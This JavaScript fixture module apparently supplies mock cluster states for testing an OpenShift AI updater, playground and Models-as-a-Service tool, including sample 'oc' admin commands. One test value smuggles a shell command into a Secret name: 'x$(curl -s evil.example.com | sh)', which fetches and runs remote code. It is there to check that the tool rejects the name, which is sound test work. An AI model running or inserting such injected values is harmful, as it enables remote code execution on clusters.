    ["validate_prerequisites", "success", "Prerequisites validated"],
    ["save_snapshot", "running", "Saving deployment snapshot"],
    ["save_snapshot", "success", "Snapshot saved"],
    ["apply_catalog_source", "success", "CatalogSource left as Git sets it", image],
    ["wait_catalog_ready", "running", "Waiting for the catalog to serve the build"],
    ["wait_catalog_ready", "success", "CatalogSource serves the build"],
    ["detect_channel", "success", "Channel: beta", "beta"],
    ["delete_csv", "running", "Deleting old CSV and InstallPlan"],
    ["delete_csv", "success", "Old CSV and InstallPlan deleted"],
    ["apply_subscription", "running", "Recreating the Subscription"],
    ["apply_subscription", "success", "Subscription applied", "beta"],
    ["verify_installplan", "running", "Waiting for OLM to install the operator"],
    ["verify_installplan", "running", "InstallPlan install-9fj2k: Installing"],
    ["verify_installplan", "running", "CSV rhods-operator.3.6.0-ea.1: Installing (InstallWaiting)"],
    ["verify_installplan", "success", "Operator installed: rhods-operator.3.6.0-ea.1", "rhods-operator.3.6.0-ea.1"],
    ["operation_complete", "success", "RHOAI nightly update complete: rhods-operator.3.6.0-ea.1 is installed."],
  ].map(([step, status, message, detail]) => ({ step, status, message, ...(detail ? { detail } : {}) }));
}

/** Happy-path OLM nightly update with each UpdateStep enumerated. */
export function updateSteps(image) {
  return [
    ["validate_prerequisites", "running", "Checking prerequisites"],
    ["validate_prerequisites", "running", "Verifying the selected catalog image"],
    ["validate_prerequisites", "success", "Prerequisites validated"],
    ["save_snapshot", "running", "Saving deployment snapshot"],
    ["save_snapshot", "success", "Snapshot saved"],
    ["apply_catalog_source", "running", "Applying CatalogSource"],
    ["apply_catalog_source", "success", "CatalogSource applied", image],
    ["wait_catalog_ready", "running", "Waiting for CatalogSource to become READY"],
    ["wait_catalog_ready", "running", "CatalogSource: CONNECTING", "CONNECTING"],
    ["wait_catalog_ready", "success", "CatalogSource is READY"],
    ["detect_channel", "running", "Detecting target channel"],
    ["detect_channel", "success", "Detected channel: stable-3.x", "stable-3.x"],
    ["delete_csv", "running", "Deleting old CSV and InstallPlan"],
    ["delete_csv", "success", "Old CSV and InstallPlan deleted"],
    ["apply_subscription", "running", "Creating Subscription"],
    ["apply_subscription", "success", "Subscription applied", "stable-3.x"],
    ["verify_installplan", "running", "Waiting for OLM to install the operator"],
    ["verify_installplan", "running", "InstallPlan install-9fj2k: Installing"],
    ["verify_installplan", "running", "CSV rhods-operator.3.6.0: Installing (InstallWaiting)"],
    ["verify_installplan", "success", "Operator installed: rhods-operator.3.6.0", "rhods-operator.3.6.0"],
    ["operation_complete", "success", "RHOAI nightly update complete: rhods-operator.3.6.0 is installed."],
  ].map(([step, status, message, detail]) => ({ step, status, message, ...(detail ? { detail } : {}) }));
}

// --- Playground (pkg/types PlaygroundStatus, PlaygroundState, PlaygroundModel) ---
// Strings mirror pkg/cluster playground.go; model lists mimic dashboard gen-ai APIs
// (aaa/models, maas/models).

export const playgroundModels = {
  qwen: { name: "qwen25-05b-instruct", displayName: "Qwen2.5 0.5B Instruct (CPU)", source: "namespace", status: "Running", ready: true, chat: true },
  granite: { name: "granite-embedding-125m-english", displayName: "Granite Embedding 125M English (CPU)", source: "namespace", status: "Running", ready: true, chat: false, embeddingDimension: 768 },
  deepseek: { name: "deepseek-r1-qwen-7b", displayName: "DeepSeek R1 Distill Qwen 7B", source: "namespace", status: "Failed", ready: false, chat: true },
  maas: { name: "gpt-oss-20b", source: "maas", status: "Ready", ready: true, chat: true, subscriptions: ["rhoai-nightly-updater-subscription"] },
  opt: { name: "publishers/llm/models/facebook/opt-125m", displayName: "Facebook OPT 125M (Simulated)", source: "maas", status: "Ready", ready: true, chat: true, subscriptions: ["rhoai-nightly-updater-subscription"] },
};

const PLAYGROUND = { name: "lsd-genai-playground", deployed: true, requested: true, managedByTool: true };
export const playgroundStates = {
  starting: (ns = "dev-project") => ({ ...PLAYGROUND, namespace: ns, ready: false, phase: "Initializing", message: "Starting (phase Initializing)" }),
  ready: (ns = "dev-project", over = {}) => ({ ...PLAYGROUND, namespace: ns, ready: true, phase: "Ready", message: "Ready", ...over }),
  foreign: (ns = "dev-project") => playgroundStates.ready(ns, { managedByTool: false, requested: false }),
  failed: (ns = "dev-project") => ({
    ...PLAYGROUND, namespace: ns, ready: false, phase: "Failed", terminalError: true,
    message: `The playground's server failed to start (phase Failed). The events of project ${ns} and its playground pods say why; delete it and set it up again.`,
  }),
  terminating: (ns = "dev-project") => ({ ...PLAYGROUND, namespace: ns, ready: false, phase: "Terminating", terminating: true, message: "Terminating" }),
};

/** Aggregate playground status: infrastructure bits, items, per-project models. */
export const playgroundWorld = (over = {}) => ({
  operatorReady: "True", genAiUi: "available", items: [],
  modelsByProject: { "dev-project": [playgroundModels.qwen, playgroundModels.maas, playgroundModels.opt], "fraud-detection": [playgroundModels.maas], "llm-eval": [playgroundModels.maas] },
  ...over,
});

export const PLAYGROUND_API_DIFFERS = "This RHOAI release's dashboard gen-ai API differs from the one this tool knows: GET /gen-ai/api/v1/aaa/models answered 404 (the requested resource could not be found). Use the playground from the dashboard's Gen AI studio instead.";
export const PLAYGROUND_BLOCKED = { component: "ogx", dsc: "default-dsc", state: "Removed", reason: "The Gen AI playground is turned off on this cluster: component ogx is Removed in DataScienceCluster default-dsc, so nothing would run it. A cluster-admin turns it on by setting it to Managed." };

// --- Models as a Service (GET /api/resources/maas, GetMaaSStatus) -------------

const MAAS_DOCS = "https://github.com/opendatahub-io/models-as-a-service/blob/main/docs/content/";
export const MAAS_INFRA = "redhat-ai-gateway-infra";
export const MAAS_AUTHORINO_COMMANDS = `oc annotate service authorino-authorino-authorization -n kuadrant-system \\
  service.beta.openshift.io/serving-cert-secret-name=authorino-server-cert --overwrite
oc patch authorino authorino -n kuadrant-system --type=merge \\
  -p '{"spec":{"listener":{"tls":{"certSecretRef":{"name":"authorino-server-cert"},"enabled":true}}}}'
oc -n kuadrant-system set env deployment/authorino \\
  SSL_CERT_FILE=/var/run/secrets/kubernetes.io/serviceaccount/service-ca.crt \\
  REQUESTS_CA_BUNDLE=/var/run/secrets/kubernetes.io/serviceaccount/service-ca.crt
oc rollout restart deployment/authorino -n kuadrant-system`;
const RHCL_WARNING = "Red Hat Connectivity Link 1.4.3 is installed; the MaaS docs ask for 1.5 or later: on 1.4.x a caller with two or more subscriptions can hang. MaaS works for a single subscription meanwhile. Upgrade Connectivity Link takes the upgrade path OLM offers, one channel at a time, and sets up Authorino TLS again afterwards.";
const RHCL_UPGRADE = {
  id: "upgrade-rhcl", label: "Upgrade Connectivity Link",
  summary: "Upgrades Red Hat Connectivity Link from 1.4.3 to 1.5 or later, as the MaaS docs ask, one channel at a time along the path OLM offers. Gateway authentication and rate limits restart during each step; it takes a few minutes.",
  changes: [
    "Subscription kuadrant-system/kuadrant-operator: channel stable to stable-1.5 (version 1.5.0). OLM upgrades the operator; there is no way back to 1.4.3.",
    "If OLM has no path from 1.4.3 straight to 1.5.0 (it then stays at 1.4.3), channel stable-1.4 first, to 1.4.4, then stable-1.5.",
    "Afterwards, Authorino TLS is set up again where an upgrade step recreated Authorino's Service (which removes its certificate).",
  ],
};
const RHCL_UPGRADE_COMMANDS = `# OLM may have no path from 1.4.3 straight to stable-1.5: go through stable-1.4 first
oc patch subscription 'kuadrant-operator' -n 'kuadrant-system' --type=merge -p '{"spec":{"channel":"stable-1.4"}}'
# once rhcl-operator.v1.4.4 is installed:
oc patch subscription 'kuadrant-operator' -n 'kuadrant-system' --type=merge -p '{"spec":{"channel":"stable-1.5"}}'`;
const RHCL_INSTALL_COMMANDS = `oc apply -f - <<'EOF'
apiVersion: v1
kind: Namespace
metadata:
  name: kuadrant-system
---
apiVersion: operators.coreos.com/v1
kind: OperatorGroup
metadata:
  name: kuadrant-operator-group
  namespace: kuadrant-system
---
apiVersion: operators.coreos.com/v1alpha1
kind: Subscription
metadata:
  name: kuadrant-operator
  namespace: kuadrant-system
spec:
  channel: stable-1.5
  installPlanApproval: Automatic
  name: rhcl-operator
  source: redhat-operators
  sourceNamespace: openshift-marketplace
  config:
    env:
    - name: RATELIMIT_CHECK_SERVICE_FAILURE_MODE
      value: deny
    - name: RATELIMIT_REPORT_SERVICE_FAILURE_MODE
      value: deny
EOF
oc wait --for=jsonpath='{.status.state}'=AtLatestKnown subscription/kuadrant-operator -n kuadrant-system --timeout=300s`;
const AUTHORINO_ACTION = {
  id: "authorino-tls", label: "Configure Authorino TLS",
  summary: "Applies the steps of the MaaS docs' setup-authorino-tls.sh to Connectivity Link's Authorino in kuadrant-system (missing: trust of the service CA (SSL_CERT_FILE)). Only what is not set yet changes; Authorino restarts. It stays after Clean up: RHOAI's inference gateway uses Authorino too.",
  changes: [
    "Service kuadrant-system/authorino-authorino-authorization: annotation service.beta.openshift.io/serving-cert-secret-name=authorino-server-cert (service-ca makes the certificate)",
    "Authorino kuadrant-system/authorino: spec.listener.tls enabled, certSecretRef authorino-server-cert",
    "Deployment kuadrant-system/authorino: SSL_CERT_FILE and REQUESTS_CA_BUNDLE at the service CA (/var/run/secrets/kubernetes.io/serviceaccount/service-ca.crt), unless it trusts the service CA already; then a rollout restart",
  ],
};
const TIER_POLICIES = {
  id: "tier-policies", title: "Old gateway policies", docUrl: `${MAAS_DOCS}migration/upgrade-to-3.4.md#phase-4-manual-cleanup-of-old-tier-resources`, state: "manual", notManaged: true,
  message: "AuthPolicy gateway-auth-policy, TokenRateLimitPolicy gateway-tier-rate-limits are on maas-default-gateway and are not managed by maas-controller. RHOAI's upgrade from the tier-based MaaS leaves its gateway policies in place, and with old and new gateway policies \"Kuadrant behavior is undefined\" (the MaaS docs' upgrade guide), so this tool publishes nothing until they are gone.",
  commands: "oc delete authpolicy 'gateway-auth-policy' -n openshift-ingress\noc delete tokenratelimitpolicy 'gateway-tier-rate-limits' -n openshift-ingress",
  actions: [{ id: "remove-tier-policies", label: "Remove the old tier policies", danger: true,
    summary: "Deletes the gateway policies of the tier-based MaaS that RHOAI's upgrade leaves behind, as the MaaS docs' upgrade guide (Phase 4) does by hand. maas-controller's own policies stay. Clients that relied on the old tiers' rules lose them.",
    changes: ["Deleted: AuthPolicy openshift-ingress/gateway-auth-policy (targets maas-default-gateway; not managed by maas-controller)", "Deleted: TokenRateLimitPolicy openshift-ingress/gateway-tier-rate-limits (targets maas-default-gateway; not managed by maas-controller)"] }],
};

/**
 * MaaS platform slice list ordered like pkg/cluster GetMaaSStatus: none, starting,
 * ready, foreign. RHCL variant "1.4.3" (third-party, below docs), "1.5.0", or
 * "missing" when the cluster never installed Connectivity Link, Kuadrant, or CNPG.
 */
export function maasParts(state, { tls = true, rhcl = "1.4.3", tierPolicies = false, cnpg = true } = {}) {
  const tool = state !== "foreign";
  const ready = state === "ready" || state === "foreign";
  const on = state !== "none";
  const fresh = rhcl === "missing";
  const parts = [
    fresh ? { id: "rhcl", title: "Red Hat Connectivity Link", docUrl: `${MAAS_DOCS}install/platform-setup.md#install-gateway-api-controller`, state: "missing",
      message: "Not installed. Set up installs version 1.5.0 from redhat-operators (channel stable-1.5), as the MaaS docs' platform setup does.", commands: RHCL_INSTALL_COMMANDS }
      : { id: "rhcl", title: "Red Hat Connectivity Link", docUrl: `${MAAS_DOCS}install/platform-setup.md#install-gateway-api-controller`, state: "ready", notManaged: true,
        message: `Version ${rhcl} runs (Subscription kuadrant-system/kuadrant-operator, channel ${rhcl === "1.4.3" ? "stable" : "stable-1.5"})`,
        ...(rhcl === "1.4.3" ? { warning: RHCL_WARNING, actions: [RHCL_UPGRADE], commands: RHCL_UPGRADE_COMMANDS } : {}) },
    fresh ? { id: "kuadrant", title: "Connectivity Link instance (Kuadrant)", docUrl: `${MAAS_DOCS}install/platform-setup.md#install-gateway-api-controller`, state: "missing",
      message: "No Kuadrant CR. Set up creates kuadrant-system/kuadrant once Connectivity Link runs, as the docs' platform setup does.", commands: "oc apply -f - <<'EOF'\napiVersion: kuadrant.io/v1beta1\nkind: Kuadrant\nmetadata:\n  name: kuadrant\n  namespace: kuadrant-system\nEOF" }
      : { id: "kuadrant", title: "Connectivity Link instance (Kuadrant)", docUrl: `${MAAS_DOCS}install/platform-setup.md#install-gateway-api-controller`, state: "ready", message: "kuadrant-system/kuadrant is ready", notManaged: true },
    !cnpg || fresh ? { id: "cnpg", title: "CloudNativePG operator", docUrl: `${MAAS_DOCS}install/maas-setup.md#database-setup`, state: "missing",
      message: "Not installed. Set up installs version 1.27.1 from certified-operators (channel stable-v1) for this tool's database. Or a cluster-admin creates Secret maas-db-config for a PostgreSQL of their own (maas-setup.md).",
      commands: "oc apply -f - <<'EOF'\napiVersion: v1\nkind: Namespace\nmetadata:\n  name: cnpg-system\n---\napiVersion: operators.coreos.com/v1\nkind: OperatorGroup\nmetadata:\n  name: cloudnative-pg\n  namespace: cnpg-system\n---\napiVersion: operators.coreos.com/v1alpha1\nkind: Subscription\nmetadata:\n  name: cloudnative-pg\n  namespace: cnpg-system\nspec:\n  channel: stable-v1\n  installPlanApproval: Automatic\n  name: cloudnative-pg\n  source: certified-operators\n  sourceNamespace: openshift-marketplace\nEOF" }
      : { id: "cnpg", title: "CloudNativePG operator", docUrl: `${MAAS_DOCS}install/maas-setup.md#database-setup`, state: "ready", message: "Version 1.27.1 runs in cnpg-system", notManaged: true },
    { id: "database", title: "Database", docUrl: `${MAAS_DOCS}install/maas-setup.md#database-setup`,
      ...(!on ? { state: "missing", message: "Not set up yet. Set up asks where MaaS keeps its API keys: your PostgreSQL, the MaaS docs' development database (one pod, ephemeral), or a persistent development database on CloudNativePG (this tool's own option, not in the MaaS docs)." }
        : tool ? { state: "ready", managedByTool: true, message: `CloudNativePG ${MAAS_INFRA}/maas-db runs (1 instance, development and test use; not in the MaaS docs: this tool's option); Secret maas-db-config set`,
          actions: [{ id: "change-database", label: "Change database", danger: true, summary: "Switches maas-api to another database. Every API key is lost: the new database starts empty.", changes: ["The Change database dialog lists what is created and deleted."] }] }
          : { state: "ready", notManaged: true, message: `Secret ${MAAS_INFRA}/maas-db-config exists: maas-api uses the database it names` }) },
    { id: "gateway", title: "MaaS gateway", docUrl: `${MAAS_DOCS}install/maas-setup.md#create-gateway`,
      ...(on ? { state: "ready", message: "maas-default-gateway in openshift-ingress, programmed at a1b2c3.elb.us-east-1.amazonaws.com", managedByTool: tool, notManaged: !tool }
        : { state: "missing", message: `Set up creates it with an external load balancer at https://maas.${APPS}` }) },
    tls === "invalid-secret" ? { id: "authorino-tls", title: "Authorino TLS", docUrl: `${MAAS_DOCS}configuration-and-management/tls-configuration.md`, state: "problem",
      message: "Not configured: the Service's serving certificate. Authorino's CR names its certificate Secret \"x$(curl -s evil.example.com | sh)\" (spec.listener.tls.certSecretRef.name), which is not a valid Kubernetes name, so no commands are shown. A cluster-admin checks Authorino authorino in kuadrant-system. Without it, API keys are refused." }
    : fresh ? { id: "authorino-tls", title: "Authorino TLS", docUrl: `${MAAS_DOCS}configuration-and-management/tls-configuration.md`, state: "missing", message: "Set up configures it once Kuadrant has made Authorino, as the docs' setup-authorino-tls.sh does." }
    : tls ? { id: "authorino-tls", title: "Authorino TLS", docUrl: `${MAAS_DOCS}configuration-and-management/tls-configuration.md`, state: "ready", message: "Authorino in kuadrant-system serves TLS and trusts the service CA", notManaged: !tool || !on, managedByTool: tool && on }
      : { id: "authorino-tls", title: "Authorino TLS", docUrl: `${MAAS_DOCS}configuration-and-management/tls-configuration.md`, state: "missing", commands: MAAS_AUTHORINO_COMMANDS, actions: [AUTHORINO_ACTION],
        message: "Not configured: trust of the service CA (SSL_CERT_FILE). Without it, API keys are refused. Set up (or Configure Authorino TLS) applies the docs' setup-authorino-tls.sh steps in kuadrant-system." },
    ...(tierPolicies ? [TIER_POLICIES] : []),
    { id: "dsc", title: "MaaS in the DataScienceCluster", docUrl: `${MAAS_DOCS}install/maas-setup.md#configure-datasciencecluster`,
      ...(on ? { state: ready ? "ready" : "waiting", message: ready ? "aigateway and modelsAsAService are Managed" : "modelsAsAService is Managed; not ready: deployments are starting", managedByTool: tool, notManaged: !tool }
        : { state: "missing", message: `aigateway is ${fresh ? "Removed" : "Managed"} and modelsAsAService is Removed. Set up sets them to Managed, last, as the docs' DataScienceCluster step does; Remove puts back what this tool changed.`,
          commands: `oc patch datasciencecluster 'default-dsc' --type=merge -p '{"spec":{"components":{"aigateway":{"managementState":"Managed","modelsAsAService":{"managementState":"Managed"}}}}}'` }) },
    { id: "maas-api", title: "MaaS API (maas-api)", docUrl: `${MAAS_DOCS}install/validation.md`,
      ...(!on ? { state: "missing", message: "The operator creates it once MaaS is turned on" } : ready ? { state: "ready", message: `Available in ${MAAS_INFRA}` } : { state: "waiting", message: "Not available yet (it restarts until the database answers)" }) },
    { id: "tenant", title: "Default tenant and gateway authentication", docUrl: `${MAAS_DOCS}install/maas-setup.md#maastenantconfig-cr`,
      ...(!on ? { state: "missing", message: "The operator creates it once MaaS is turned on" } : ready ? { state: "ready", message: "Tenant models-as-a-service is Ready; the gateway's authentication is enforced" } : { state: "waiting", message: "Waiting for the operator (tenant missing, configuration missing, authentication missing)" }) },
  ];
  // CNPG appears as a platform part only after it backs the DB (pkg/cluster
  // maasDatabaseStatus); beforehand it is just a database option.
  return on ? parts : parts.filter((p) => p.id !== "cnpg");
}

/** Database selector state (pkg/cluster maasDatabaseStatus): unset, tool CNPG, or adopted external. */
export function maasDatabase(state, { fresh = false, current: kind } = {}) {
  const choices = [
    { id: "external", plan: [`Write Secret ${MAAS_INFRA}/maas-db-config (label app=maas-api) with the connection URL you enter; nothing else is created, and your database is never changed`] },
    { id: "development", plan: [`Run the MaaS docs' development PostgreSQL (scripts/setup-database.sh) in ${MAAS_INFRA}: Secret postgres-creds (a generated password), Deployment postgres (one pod, image registry.redhat.io/rhel9/postgresql-16@sha256:${"5".repeat(64)}, from the RHOAI operator's CSV (postgresql_16_image); no volume, so its data is lost when the pod restarts) and Service postgres, then Secret maas-db-config with its address (sslmode=disable, as the script does)`] },
    { id: "cnpg", plan: [
      ...(fresh ? ["Install CloudNativePG 1.27.1: Namespace cnpg-system, OperatorGroup cnpg-system/cloudnative-pg, Subscription cnpg-system/cloudnative-pg (package cloudnative-pg, channel stable-v1, from certified-operators; in its own namespace, not openshift-operators, where an install can pull an OSSM upgrade that breaks the gateway; it stays after Clean up)"] : []),
      `Run a one-instance CloudNativePG database ${MAAS_INFRA}/maas-db (1 GiB volume, so keys survive restarts) and write Secret ${MAAS_INFRA}/maas-db-config with its address (sslmode=require)`] },
  ];
  const current = kind ?? (state === "none" ? "" : state === "foreign" ? "adopted" : "cnpg");
  return { current, namespace: MAAS_INFRA, default: "development", ...(current === "" ? { needed: true } : {}), ...(current === "adopted" ? {} : { choices }), ...(current === "adopted" ? { choices: [] } : {}) };
}

/**
 * When dbCurrent is development or external, rewrite the Database part message to
 * backend copy and drop the CNPG row (CNPG section only applies to that backend).
 */
function maasDBParts(parts, dbCurrent) {
  if (dbCurrent !== "development" && dbCurrent !== "external") return parts;
  const message = dbCurrent === "development"
    ? `The MaaS docs' development database ${MAAS_INFRA}/postgres runs (one pod, no volume). Ephemeral: API keys are lost when its pod restarts, and maas-api then needs a restart to make its tables again.`
    : `Your PostgreSQL: Secret ${MAAS_INFRA}/maas-db-config, written by this tool, holds the connection URL you entered (never shown). Remove deletes only that Secret; your database is never touched.`;
  return parts.filter((p) => p.id !== "cnpg").map((p) => (p.id === "database" && p.state === "ready" ? { ...p, message } : p));
}

/** Known OpenShift groups on the mock cluster (GET /api/resources/maas/groups). */
export const MAAS_GROUPS = ["ml-team"];

/** Missing MaaS group diagnostics (pkg/cluster maasGroupProblems) plus oc adm hints when valid. */
export function maasGroupProblems(names) {
  const openShiftName = (n) => n !== "." && n !== ".." && n !== "~" && !/[/%:]/.test(n);
  return names.filter((g) => !MAAS_GROUPS.includes(g)).map((g) => ({
    name: g, missing: true, message: `${g} is not a group on this cluster. Nobody is in it unless your identity provider adds it at sign-in.`,
    ...(openShiftName(g) ? { commands: `oc adm groups new ${g}\noc adm groups add-users ${g} <user>` } : {}),
  }));
}

/** Token-rate presets for published models (pkg/types MaaSLimit). */
export const maasLimit = (preset = "free") => ({
  free: { preset: "free", rates: [{ limit: 100, window: "1m" }] },
  premium: { preset: "premium", rates: [{ limit: 100000, window: "24h" }] },
  unlimited: { preset: "unlimited", unlimited: true },
  custom: { preset: "custom", rates: [{ limit: 500, window: "1m" }, { limit: 20000, window: "1h" }] },
})[preset];

/** Planned creates for absent platform parts (pkg/cluster GetMaaSStatus setupPlan). */
function maasSetupPlan(parts, { fresh }) {
  const plan = [];
  const missing = (id) => parts.find((p) => p.id === id)?.state === "missing";
  if (missing("rhcl")) plan.push("Install Red Hat Connectivity Link 1.5.0: Namespace kuadrant-system, OperatorGroup kuadrant-system/kuadrant-operator-group, Subscription kuadrant-system/kuadrant-operator (package rhcl-operator, channel stable-1.5, from redhat-operators, with spec.config.env RATELIMIT_CHECK_SERVICE_FAILURE_MODE=deny and RATELIMIT_REPORT_SERVICE_FAILURE_MODE=deny, as the MaaS docs recommend, so requests are refused rather than let through unlimited while Limitador is unavailable)");
  if (missing("kuadrant")) plan.push("Create the Kuadrant CR kuadrant-system/kuadrant");
  // Database provisioning steps live in maasDatabase; Set up only ensures the namespace.
  if (missing("database") && fresh) plan.push(`Create namespace ${MAAS_INFRA} (the AI gateway's infrastructure namespace, where the docs' setup-database.sh puts the database; recorded, and deleted by Remove when nothing else is in it)`);
  if (missing("gateway")) plan.push(`Create Gateway openshift-ingress/maas-default-gateway with an external load balancer at maas.${APPS} (a cloud cost while it exists), and GatewayClass openshift-default if the cluster has none`);
  if (missing("authorino-tls")) plan.push("Configure Authorino TLS as the docs' setup-authorino-tls.sh does: the serving-certificate annotation on Service authorino-authorino-authorization, TLS on the Authorino CR's listener, SSL_CERT_FILE on Deployment authorino, then restart it");
  if (missing("dsc")) plan.push(`DataScienceCluster default-dsc: ${fresh ? "aigateway.managementState Removed to Managed, " : ""}aigateway.modelsAsAService.managementState Removed to Managed (the values before are recorded, and Remove restores them)`);
  return plan;
}

/**
 * Tool-owned dev-project model (defaults to qwen25): published flag plus optional
 * maasOnlySetup meaning Models-tab-only routing—unpublish drops every route
 * (pkg/cluster MaaSModel.MaaSOnlySetup).
 */
export function maasModel(published, { ready = true, name = "qwen25-05b-instruct", maasOnlySetup = false } = {}) {
  return {
    namespace: "dev-project", name, displayName: displayOf(name), managedByTool: true, modelReady: true,
    deployed: published, ready: published && ready, published, message: published ? (ready ? "Published" : "Published; waiting") : "Not published",
    ...(published ? { phase: ready ? "Ready" : "Pending", endpoint: `https://maas.${APPS}/dev-project/${name}`, access: ready ? "Active" : "Pending", subscription: ready ? "Active" : "Pending" } : {}),
    ...(published && maasOnlySetup ? { maasOnlySetup: true } : {}),
  };
}

/** Dual-gateway publication left by an older build (GetMaaSStatus). */
export function maasEarlierBuildPublication({ name = "qwen25-05b-instruct" } = {}) {
  return { ...maasModel(true, { name }), ready: false, partly: true,
    message: "Partly published: the model routes through openshift-ingress/maas-default-gateway and openshift-ingress/openshift-ai-inference, as an earlier build of this tool published it, so calls to its direct address fail with 500. Unpublish, then Publish again." };
}

/**
 * Publication whose recorded refs omit a gateway someone attached later
 * (GetMaaSStatus refsAddedStatus).
 */
export function maasSomeoneAddedPublication({ name = "qwen25-05b-instruct" } = {}) {
  return { ...maasModel(true, { name }), ready: false, partly: true,
    message: `Partly published: someone added openshift-ingress/openshift-ai-inference since the model was published, so direct calls to the model through that gateway fail with 500 once the rate limit applies to it. Unpublish and Publish refuse, since writing back the gateways the model had before would drop it. Set the gateways the model should use yourself, without maas-default-gateway (for KServe's default gateway: oc patch llminferenceservice ${name} -n dev-project --type=merge -p '{"spec":{"router":{"gateway":{"refs":null}}}}'), then Unpublish.` };
}

/** env-models-several trio: configurable Qwen2.5/Qwen3 rows plus embedding entry MaaS never sells. */
export function maasSeveral(qwen25 = maasModel(true), qwen3 = maasModel(false, { name: "qwen3-1-7b" })) {
  return [maasEmbeddingModel(), qwen25, qwen3];
}

/**
 * Toggle MaaS-only routing for one model: when published, inference gateway Used-by
 * drops the ref (pkg/cluster gatewayUsers). Sibling models unchanged. maasOnlySetup
 * means internal-only reachability until published—never on the shared inference gateway
 * (ModelState.maasOnlySetup).
 */
export function setMaaSPublished(resources, project, model, published, { maasOnlySetup = false } = {}) {
  const ref = `${project}/${model}`;
  let noRoute = false;
  const items = resources?.models?.items ?? [];
  for (const [i, m] of items.entries()) {
    if (m.namespace !== project || m.name !== model) continue;
    if (published) {
      // Published shape from pkg/cluster: sole MaaS gateway, public MaaS URL, MaaS health probe.
      const url = `https://maas.${APPS}/${project}/${model}`;
      items[i] = { ...routed({ ...m, url }, { exposure: "maas", check: undefined }), maasPublished: true, ...(maasOnlySetup ? { maasOnlySetup: true } : {}),
        callCheck: { result: "maas", ok: true, url, message: "MaaS lists the model (its reference is Ready). Calls go through MaaS with an API key, which this tool does not create: the MaaS tab's commands get one and call the model.", at: "2026-11-18T18:04:12Z" } };
      continue;
    }
    noRoute = !!m.maasOnlySetup;
    const { maasPublished: _p, maasOnlySetup: _o, ...rest } = m;
    items[i] = noRoute ? routed(rest, { exposure: "internal", check: undefined }) : routed({ ...rest, url: `${INFERENCE}/${project}/${model}` });
  }
  const gw = resources?.inferenceGateway;
  if (!gw?.deployed || !gw.managedByTool) return;
  const others = (gw.usedBy ?? []).filter((u) => u !== ref);
  const { usedBy: _list, teardownBlockedReason: _reason, ...rest } = gw;
  resources.inferenceGateway = { ...rest, ...usedBy(published || noRoute ? others : [...others, ref].sort()) };
}

/** Embedding catalog row listed but blocked from MaaS publish (pkg/cluster maasEmbeddingReason). */
export const maasEmbeddingModel = () => ({
  namespace: "dev-project", name: "granite-embedding-125m-english", displayName: displayOf("granite-embedding-125m-english"), managedByTool: true, modelReady: true,
  deployed: false, ready: false, published: false, message: "Not offered for MaaS",
  setupBlockedReason: "This tool publishes chat models only. Use the embedding model at its own address (the Models tab shows it), or add it to the Gen AI playground.",
});

/** Orphan publication: missing project, listed only under GetMaaSStatus.removing. */
export function maasGonePublication(namespace) {
  return { namespace, name: "qwen25-05b-instruct", reason: `project ${namespace} no longer exists` };
}

/** Teardown guard when foreign MaaS consumers exist (pkg/cluster teardown, foreignMaaSObjects). */
export const MAAS_IN_USE = "Others use this MaaS platform: MaaSModelRef team-a/granite-3-8b, MaaSSubscription models-as-a-service/team-a-subscription. Removing it would break them. They unpublish and remove theirs first. Nothing was deleted.";

/** Compose full MaaS status for a platform state enum. */
export function maasWorld(state = "none", { tls = true, items = [], blocked = null, noCNPG = false, rhcl = state === "none" ? "1.4.3" : "1.5.0", tierPolicies = false, access = { everyone: true }, dbCurrent, noUnlimited = false } = {}) {
  const parts = maasDBParts(maasParts(state, { tls, rhcl, tierPolicies, cnpg: !noCNPG }), dbCurrent);
  const shared = ["rhcl", "kuadrant", "cnpg", "authorino-tls", "tier-policies"];
  const allReady = parts.every((p) => p.state === "ready");
  const tool = parts.some((p) => p.managedByTool && !shared.includes(p.id));
  const waiting = parts.filter((p) => p.state !== "ready" && p.state !== "missing").map((p) => p.title);
  const setupPlan = blocked ? [] : maasSetupPlan(parts, { fresh: rhcl === "missing" });
  const notReady = parts.find((p) => p.state !== "ready");
  return {
    ...(blocked ? { blocked } : {}),
    platform: {
      namespace: MAAS_INFRA, deployed: state !== "none", ready: allReady, managedByTool: tool,
      message: allReady ? "Ready" : state === "none" && waiting.length === 0 ? "Not set up" : `Needs attention: ${waiting.join(", ")}`,
      ...(blocked ? { setupBlockedReason: blocked.reason } : {}),
      ...(!tool ? { teardownBlockedReason: "No part of the MaaS platform was set up by this tool, so there is nothing for it to remove." } : {}),
    },
    parts, url: `https://maas.${APPS}`, subscription: "rhoai-nightly-updater-subscription", dashboardUrl: DASHBOARD_URL,
    ...(setupPlan.length ? { setupPlan } : {}),
    items: items.map((i) => (i.published || allReady || !notReady ? i : { ...i, setupBlockedReason: state === "none" && !tool ? "Set up the MaaS platform first." : `The MaaS platform is not ready: ${notReady.title} (see above).` }))
      .map((i) => (i.published && !i.partly && !i.limit ? { ...i, limit: maasLimit("free") } : i)),
    database: maasDatabase(state, { fresh: rhcl === "missing" || noCNPG, current: dbCurrent }),
    ...(noUnlimited ? { noUnlimited: true } : {}),
    ...(items.some((i) => i.published) ? { access, subscriptionPriority: { value: 0 } } : {}),
  };
}

/** This tool's subscription at priority 10, as an earlier version left it, with the fix and two admin subscriptions at 0 (pkg/cluster maasPriorityState). */
export function maasOldPriority(value = 10) {
  return {
    value, ties: [{ name: "no-org-oidc-49315", priority: 0 }, { name: "org-49315", priority: 0 }, { name: "legacy-free", priority: -1 }],
    fix: { id: "subscription-priority", label: "Set to the lowest priority (0)",
      summary: `Sets the priority of this tool's subscription from ${value} to 0, the lowest MaaS honours, so that it no longer outranks other subscriptions: for a key made without naming a subscription, MaaS takes the caller's subscription with priority 1 or more, and among those at 0 the one whose largest single token limit on any of its models is larger (the time window is not compared; Unlimited counts as largest), then the first by name. Naming the subscription when you create a key avoids the choice. Keys made before keep the subscription they were bound to: revoke them and make them again.`,
      changes: [`MaaSSubscription models-as-a-service/rhoai-nightly-updater-subscription: spec.priority ${value} to 0 (a merge patch with the read resourceVersion, after a server-side dry run); nothing else of it changes.`] },
  };
}

export const MAAS_BLOCKED = { component: "aigateway",
  reason: "MaaS needs RHOAI's DataScienceCluster, and this cluster has none. A cluster-admin creates one on the Components page." };

// --- Model exposure planner (GET /api/resources/models/exposures) -------------------

const GW_KEY = "openshift-ingress/openshift-ai-inference";

/** Exposure options for a model/project pair (pkg/cluster planExposures) given gateway preconditions. */
export function modelExposures(project, model, gw, { maasReady = false, otherGateway = false, authReady = true } = {}) {
